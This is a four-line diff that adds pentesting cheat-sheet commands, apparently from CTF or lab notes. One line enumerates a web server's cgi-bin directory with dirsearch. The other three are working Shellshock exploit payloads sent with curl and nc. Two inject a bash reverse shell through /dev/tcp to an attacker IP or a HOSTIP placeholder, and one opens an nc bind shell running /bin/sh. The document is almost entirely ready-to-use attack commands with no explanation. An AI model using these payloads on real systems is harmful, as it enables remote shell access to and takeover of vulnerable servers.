@@ -1,0 +1,4 @@
+sudo python3 dirsearch.py -u http://10.10.10.56:80/cgi-bin/ -e cgi,sh #Check for sh/cgi file inside cgi
+curl -A “() { :; }; /bin/bash -i > /dev/tcp/192.168.2.13/9000 0<&1 2>&1” http://192.168.2.18/cgi-bin/helloworld.cgi
+curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
